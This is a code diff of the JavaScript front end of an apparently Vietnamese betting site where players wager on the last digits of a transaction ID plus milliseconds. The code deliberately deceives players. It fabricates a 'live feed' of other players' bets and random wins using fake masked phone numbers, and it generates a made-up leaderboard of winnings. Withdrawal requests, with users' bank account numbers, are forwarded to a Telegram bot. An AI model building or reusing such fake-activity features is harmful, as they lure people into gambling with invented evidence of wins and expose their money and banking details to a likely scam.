+                    else if (c==='N1' && ['1','5','7'].includes(last1)) isWin=true; else if (c==='N2' && ['2','4','8'].includes(last1)) isWin=true; else if (c==='N3' && ['3','6','9'].includes(last1)) isWin=true;
+                    else if (c==='KG3') {
+                        if (['123','234','456','678','789'].includes(last3)) { isWin=true; rate=5; matchStr=last3; }
+                        else if (['66','99'].includes(last2)) { isWin=true; rate=4; matchStr=last2; }
+                        else if (['02','13','17','19','21','29','35','37','47','49','51','54','57','63','64','74','83','91','95','96'].includes(last2)) { isWin=true; rate=3; matchStr=last2; }
+                    }
+
+                    resBox.style.display = 'block'; resBox.style.background = isWin ? 'rgba(16, 185, 129, 0.1)' : 'rgba(244, 63, 94, 0.1)';
+                    resBox.innerHTML = `<div style="font-size:15px; color:gray;"><b>${transId}</b> + <b>${finalMs}</b></div><div style="font-size:22px; font-weight:bold; color:#fff;">= ${totalStr}</div><div style="margin-top:15px; font-size:26px; font-weight:bold; color:${isWin?'var(--success)':'var(--danger)'};">${isWin?`🎉 WIN! (+${(document.getElementById('coinAmount').value*rate).toLocaleString()}đ)`:`😢 THUA!`}</div>`;
                 }
             }, 40);
         }
 
-        function calculateFinalResult(numStr, ms) {
-            // Tổng: BigInt do số rất dài
-            const totalStr = (BigInt(numStr) + BigInt(ms)).toString();
-            const choice = activeBet.choice;
-            
-            let isWin = false;
-            let finalRate = activeBet.rate;
-            let matchStr = "";
-
-            const last1 = totalStr.slice(-1);
-            const last2 = totalStr.slice(-2);
-            const last3 = totalStr.slice(-3);
-
-            // LOGIC KIỂM TRA
-            if (choice === 'C' && ['2','4','6','8'].includes(last1)) isWin = true;
-            else if (choice === 'L' && ['1','3','5','7'].includes(last1)) isWin = true;
-            else if (choice === 'C2' && ['0','2','4','6','8'].includes(last1)) isWin = true;
-            else if (choice === 'L2' && ['1','3','5','7','9'].includes(last1)) isWin = true;
-            else if (choice === 'CC' && ['1','2','3','4','5'].includes(last1)) isWin = true;
-            else if (choice === 'LL' && ['6','7','8','9','0'].includes(last1)) isWin = true;
-            else if (choice === 'N1' && ['1','5','7'].includes(last1)) isWin = true;
-            else if (choice === 'N2' && ['2','4','8'].includes(last1)) isWin = true;
-            else if (choice === 'N3' && ['3','6','9'].includes(last1)) isWin = true;
-            else if (choice === 'KG3') {
-                if (['123','234','456','678','789'].includes(last3)) { isWin = true; finalRate = 5; matchStr = last3; }
-                else if (['66','99'].includes(last2)) { isWin = true; finalRate = 4; matchStr = last2; }
-                else if (['02','13','17','19','21','29','35','37','47','49','51','54','57','63','64','74','83','91','95','96'].includes(last2)) { isWin = true; finalRate = 3; matchStr = last2; }
-            }
-
-            // Hiển thị UI
-            const amt = parseInt(document.getElementById('coinAmount').value);
-            const receive = isWin ? (amt * finalRate) : 0;
-
-            const resBox = document.getElementById('finalResultBox');
-            resBox.style.display = 'block';
-            resBox.style.background = isWin ? 'rgba(16, 185, 129, 0.1)' : 'rgba(244, 63, 94, 0.1)';
-            resBox.style.borderColor = isWin ? 'var(--success)' : 'var(--danger)';
-
-            resBox.innerHTML = `
-                <div style="font-size: 15px; margin-bottom: 12px; color: var(--text-muted);">
-                    <b style="color:#fff">${numStr}</b> (Mã GD) <span style="color:var(--primary)">+</span> <b style="color:#fff">${ms}</b> (Milisecond)
-                </div>
-                <div style="font-size: 22px; font-weight: 800; margin-bottom: 15px; color: #fff; letter-spacing: 2px;">
-                    = ${totalStr}
-                </div>
-                <div style="font-size: 15px; color: var(--text-muted); border-top: 1px dashed rgba(255,255,255,0.1); padding-top: 15px;">
-                    Cửa cược: <b style="color: #fff;">${choice}</b> &nbsp;|&nbsp; Xét đuôi: <b style="color: var(--primary); font-size: 18px; background: rgba(0,0,0,0.5); padding: 2px 8px; border-radius: 6px;">${choice === 'KG3' ? (matchStr || last2) : last1}</b>
-                </div>
-                <div style="margin-top: 20px; font-size: 26px; font-weight: 900; text-transform: uppercase; color: ${isWin ? 'var(--success)' : 'var(--danger)'}; text-shadow: 0 0 10px ${isWin ? 'rgba(16, 185, 129, 0.5)' : 'rgba(244, 63, 94, 0.5)'};">
-                    ${isWin ? `🎉 WIN! (+${receive.toLocaleString()}đ)` : `😢 THUA MẤT RỒI!`}
-                </div>
-                <p style="margin-top: 15px; font-size: 12px; color: #64748b;">(Lưu ý: Tính năng quay số frontend mang tính biểu diễn minh họa, kết quả cộng tiền chính thức sẽ do máy chủ cập nhật).</p>
-            `;
-        }
-
         /* ========================================================
-           SYSTEM: LIVE FEED GIAO DỊCH (THẬT + ẢO)
+           SYSTEM: UI CHUNG (TABS, LIVE FEED, RANKING...)
         ======================================================== */
-        let liveFeedList = [];
-        const choicesPool = ['C', 'L', 'C2', 'L2', 'CC', 'LL', 'N1', 'N2', 'N3', 'KG3'];
-        const phonePrefixes = ['098', '097', '038', '039', '091', '094', '086', '088'];
+        window.switchTab = function(t, e) { document.querySelectorAll('.section-content').forEach(el => el.classList.remove('active')); document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active')); document.getElementById(`sec-${t}`).classList.add('active'); if(e) e.classList.add('active'); if(window.innerWidth <= 768) window.toggleSidebar(); }
+        window.toggleSidebar = function() { document.getElementById('sidebar').classList.toggle('open'); };
+        window.switchGameMode = function(m, e) { document.querySelectorAll('.btn-tab').forEach(el => el.classList.remove('active')); e.classList.add('active'); document.querySelectorAll('.game-mode-content').forEach(el => el.classList.remove('active')); document.getElementById(`mode-${m}`).classList.add('active'); document.getElementById('qr-result').style.display = 'none'; document.getElementById('playArea').style.display = 'none'; }
 
+        // Live Feed & Ranking (Ảo + Thật)
+        let liveFeedList = [];
+        const phonePrefixes = ['098', '097', '038', '039', '091', '094', '086', '088'];
         function generateFakeTransaction() {
             const pre = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
             const suf = Math.floor(10 + Math.random() * 89);
             const fakePhone = `${pre}*****${suf}`;
-            const choice = choicesPool[Math.floor(Math.random() * choicesPool.length)];
+            const choices = ['C', 'L', 'C2', 'L2', 'CC', 'LL', 'N1', 'N2', 'N3', 'KG3'];
+            const choice = choices[Math.floor(Math.random() * choices.length)];
             const amount = (Math.floor(Math.random() * 20) + 2) * 10000; 
             const isWin = Math.random() > 0.5; 
-            
-            let rate = 2;
-            if (['C2','L2','CC','LL'].includes(choice)) rate = 1.5;
-            if (['N1','N2','N3'].includes(choice)) rate = 3;
-            if (choice === 'KG3') rate = [3,4,5][Math.floor(Math.random()*3)];
-
+            let rate = 2; if (['C2','L2','CC','LL'].includes(choice)) rate = 1.5; if (['N1','N2','N3'].includes(choice)) rate = 3; if (choice === 'KG3') rate = [3,4,5][Math.floor(Math.random()*3)];
             return { maskedPhone: fakePhone, amount: amount, choice: choice, status: isWin ? 'win' : 'lose', rate: rate };
         }
 
@@ -605,94 +740,48 @@
             try {
                 const q = query(collection(db, "giaodich"), orderBy("createdAt", "desc"), limit(5));
                 const snap = await getDocs(q);
-                snap.forEach(doc => {
-                    const tx = doc.data();
-                    liveFeedList.push({ maskedPhone: tx.maskedPhone || 'AnDanh***', amount: tx.amount, choice: tx.choice.split(' ')[0], status: tx.status, rate: tx.rate });
-                });
+                snap.forEach(doc => { const tx = doc.data(); liveFeedList.push({ maskedPhone: tx.maskedPhone || 'AnDanh***', amount: tx.amount, choice: tx.choice.split(' ')[0], status: tx.status, rate: tx.rate }); });
             } catch (e) {}
-
             while(liveFeedList.length < 6) liveFeedList.push(generateFakeTransaction());
             renderLiveFeed();
-
-            setInterval(() => {
-                liveFeedList.unshift(generateFakeTransaction());
-                if(liveFeedList.length > 7) liveFeedList.pop(); 
-                renderLiveFeed();
-            }, 5000);
-
+            setInterval(() => { liveFeedList.unshift(generateFakeTransaction()); if(liveFeedList.length > 7) liveFeedList.pop(); renderLiveFeed(); }, 5000);
             window.renderLeaderboard('week');
         }
 
         function renderLiveFeed() {
-            const container = document.getElementById('liveFeedContainer');
-            container.innerHTML = '';
+            const container = document.getElementById('liveFeedContainer'); container.innerHTML = '';
             liveFeedList.forEach(tx => {
                 const isWin = tx.status === 'win';
                 const moneyStr = isWin ? `<span style="color:var(--success)">+${(tx.amount * tx.rate).toLocaleString()}đ</span>` : `<span style="color:var(--danger)">-${tx.amount.toLocaleString()}đ</span>`;
-                container.innerHTML += `
-                    <div class="live-row">
-                        <div>
-                            <div class="l-phone"><i class="fa-solid fa-user-secret" style="color:var(--text-muted); margin-right:5px;"></i> ${tx.maskedPhone}</div>
-                            <div class="l-detail">Cược: <b style="color:#fff">${tx.choice}</b> - Đặt: ${tx.amount.toLocaleString()}đ</div>
-                        </div>
-                        <div style="font-weight: 800; font-size: 15px; letter-spacing: 1px;">${moneyStr}</div>
-                    </div>`;
+                container.innerHTML += `<div class="live-row"><div><div class="l-phone"><i class="fa-solid fa-user-secret" style="color:var(--text-muted); margin-right:5px;"></i> ${tx.maskedPhone}</div><div class="l-detail">Cược: <b style="color:#fff">${tx.choice}</b> - Đặt: ${tx.amount.toLocaleString()}đ</div></div><div style="font-weight: 800; font-size: 15px; letter-spacing: 1px;">${moneyStr}</div></div>`;
             });
         }
 
-        /* ========================================================
-           SYSTEM: LEADERBOARD BẢNG XẾP HẠNG
-        ======================================================== */
         window.renderLeaderboard = function(type, element = null) {
-            if(element) {
-                element.parentElement.querySelectorAll('.btn-tab').forEach(el => el.classList.remove('active'));
-                element.classList.add('active');
-            }
-
-            const container = document.getElementById('leaderboardContainer');
-            container.innerHTML = '';
-
-            let seed = type === 'week' ? new Date().getDay() : new Date().getMonth(); 
-            let multiplier = type === 'week' ? 1 : 5; 
-
+            if(element) { element.parentElement.querySelectorAll('.btn-tab').forEach(el => el.classList.remove('active')); element.classList.add('active'); }
+            const container = document.getElementById('leaderboardContainer'); container.innerHTML = '';
+            let seed = type === 'week' ? new Date().getDay() : new Date().getMonth(); let multiplier = type === 'week' ? 1 : 5; 
             for(let i = 1; i <= 10; i++) {
                 let fakeAmt = Math.floor(250 - (i * 18) + (seed * 2)) * 100000 * multiplier;
-                let pre = phonePrefixes[(i + seed) % phonePrefixes.length];
-                let suf = (i * 13 + seed) % 100;
+                let pre = phonePrefixes[(i + seed) % phonePrefixes.length]; let suf = (i * 13 + seed) % 100;
                 let phone = `${pre}*****${suf.toString().padStart(2, '0')}`;
-
-                let rankClass = "rank-normal";
-                if(i === 1) rankClass = "rank-1";
-                if(i === 2) rankClass = "rank-2";
-                if(i === 3) rankClass = "rank-3";
-
-                container.innerHTML += `
-                    <div class="top-row">
-                        <div class="rank-icon ${rankClass}">${i}</div>
-                        <div class="top-info"><span>${phone}</span><small>Tổng nhận thưởng</small></div>
-                        <div class="top-amount">${fakeAmt.toLocaleString()}đ</div>
-                    </div>`;
+                let rankClass = "rank-normal"; if(i === 1) rankClass = "rank-1"; if(i === 2) rankClass = "rank-2"; if(i === 3) rankClass = "rank-3";
+                container.innerHTML += `<div class="top-row"><div class="rank-icon ${rankClass}">${i}</div><div class="top-info"><span>${phone}</span><small>Tổng nhận thưởng</small></div><div class="top-amount">${fakeAmt.toLocaleString()}đ</div></div>`;
             }
         }
 
-        // ==================== CÁC HÀM CŨ GIỮ NGUYÊN ====================
+        // ==================== CÁC CHỨC NĂNG RÚT/LƯU/TRA SOÁT ====================
         window.requestWithdraw = async function() {
             if (!currentUserUid || !globalUserData) return;
             const withdrawAmount = parseInt(document.getElementById('withdrawAmount').value);
             if (!withdrawAmount || withdrawAmount < 50000) return showNotification("⚠️ Lỗi", "Rút tối thiểu 50.000đ!", "error");
             if (globalUserData.balance < withdrawAmount) return showNotification("⚠️ Lỗi", "Số dư không đủ!", "error");
             if (!globalUserData.bankAccount) return showNotification("⚠️ Lỗi", "Vui lòng cập nhật STK!", "error");
-
-            const btn = document.getElementById('btnSubmitWithdraw');
-            btn.disabled = true; btn.innerHTML = 'Đang gửi...';
+            const btn = document.getElementById('btnSubmitWithdraw'); btn.disabled = true; btn.innerHTML = 'Đang gửi...';
             try {
                 const teleMsg = `🚨 *YÊU CẦU RÚT TIỀN*\n👤 User: ${globalUserData.email}\n💰 Rút: ${withdrawAmount.toLocaleString()}đ\n💳 STK: ${globalUserData.bankAccount}`;
-                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: telegramChatId, text: teleMsg, parse_mode: 'Markdown' })
-                });
-                document.getElementById('withdrawAmount').value = '';
-                showNotification("✅ Đã gửi", "Yêu cầu rút đã chuyển cho Admin!", "success");
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: telegramChatId, text: teleMsg, parse_mode: 'Markdown' }) });
+                document.getElementById('withdrawAmount').value = ''; showNotification("✅ Đã gửi", "Yêu cầu rút đã chuyển cho Admin!", "success");
             } catch (error) {} finally { btn.disabled = false; btn.innerHTML = 'Gửi Yêu Cầu Rút Tiền'; }
         };
 
@@ -711,8 +800,7 @@
         window.searchTransaction = async function() {
             const transId = document.getElementById('searchTransId').value.trim();
             const resBox = document.getElementById('searchResultBox');
-            if (!transId) return;
-            resBox.style.display = 'block'; resBox.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Đang tìm kiếm...';
+            if (!transId) return; resBox.style.display = 'block'; resBox.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Đang tìm kiếm...';
             try {
                 const docSnap = await getDoc(doc(db, "giaodich", transId));
                 if (docSnap.exists()) {
@@ -722,37 +810,6 @@
                 } else resBox.innerHTML = `<p style="color: var(--warning)"><i class="fa-solid fa-triangle-exclamation"></i> Mã giao dịch không tồn tại.</p>`;
             } catch (error) { resBox.innerHTML = 'Lỗi hệ thống tra cứu.'; }
         };
-
-        window.switchTab = function(tabName, element) {
-            document.querySelectorAll('.section-content').forEach(el => el.classList.remove('active'));
-            document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active'));
-            document.getElementById(`sec-${tabName}`).classList.add('active');
-            if(element) element.classList.add('active');
-            if(window.innerWidth <= 768) window.toggleSidebar();
-        };
-        window.toggleSidebar = function() { document.getElementById('sidebar').classList.toggle('open'); };
-
-        window.switchGameMode = function(modeName, element) {
-            document.querySelectorAll('.btn-tab').forEach(el => el.classList.remove('active'));
-            element.classList.add('active');
-            document.querySelectorAll('.game-mode-content').forEach(el => el.classList.remove('active'));
-            document.getElementById(`mode-${modeName}`).classList.add('active');
-            document.getElementById('qr-result').style.display = 'none';
-            document.getElementById('playArea').style.display = 'none';
-        }
-
-        async function fetchHistory(uid) {
-            const tbody = document.getElementById('historyTableBody');
-            const q = query(collection(db, `users/${uid}/transactions`), orderBy("createdAt", "desc"), limit(10));
-            const querySnapshot = await getDocs(q);
-            tbody.innerHTML = '';
-            if (querySnapshot.empty) return tbody.innerHTML = `<tr><td colspan=\"5\" style=\"text-align:center;\">Chưa có giao dịch</td></tr>`;
-            querySnapshot.forEach((doc) => {
-                const tx = doc.data(), d = tx.createdAt ? tx.createdAt.toDate() : new Date();
-                const badge = tx.status === 'win' ? `<span class=\"badge win\">Thắng (+${(tx.amount*tx.rate).toLocaleString()}đ)</span>` : `<span class=\"badge lose\">Thua</span>`;
-                tbody.innerHTML += `<tr><td>${tx.transId}</td><td>${d.getHours()}:${d.getMinutes().toString().padStart(2,'0')} ${d.getDate()}/${d.getMonth()+1}</td><td><b>${tx.choice}</b></td><td>${tx.amount.toLocaleString()}đ</td><td>${badge}</td></tr>`;
-            });
-        }
     </script>
     <script type="text/javascript">
         var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
